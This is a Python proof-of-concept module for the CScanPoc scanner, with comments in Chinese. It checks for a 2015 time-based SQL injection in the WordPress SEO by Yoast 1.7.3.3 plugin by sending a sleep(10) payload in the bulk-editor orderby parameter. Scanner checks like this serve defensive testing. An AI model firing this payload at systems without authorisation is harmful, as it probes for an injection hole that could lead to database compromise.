# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'WordPress_0011'  # 平台漏洞编号，留空
    name = 'WordPress SEO by Yoast 1.7.3.3 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''
        该漏洞仅影响WordPress内部用户，因为该漏洞存在于admin/class-bulk-editor-list-table.php文件中，
        而此文件只有WordPress管理员、编辑和特权作者才能访问。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/news/60715.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress SEO by Yoast 1.7.3.3'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cba2363f-1e1a-41b1-912b-51a86362ec81'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby="
                       "post_date%2c(select%20*%20from%20(select(sleep(10)))a)&order=asc")
            start = time.time()
            verify_url = self.target + payload
            req = requests.post(verify_url)

            if time.time() - start > 10 and req.status_code == 200:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
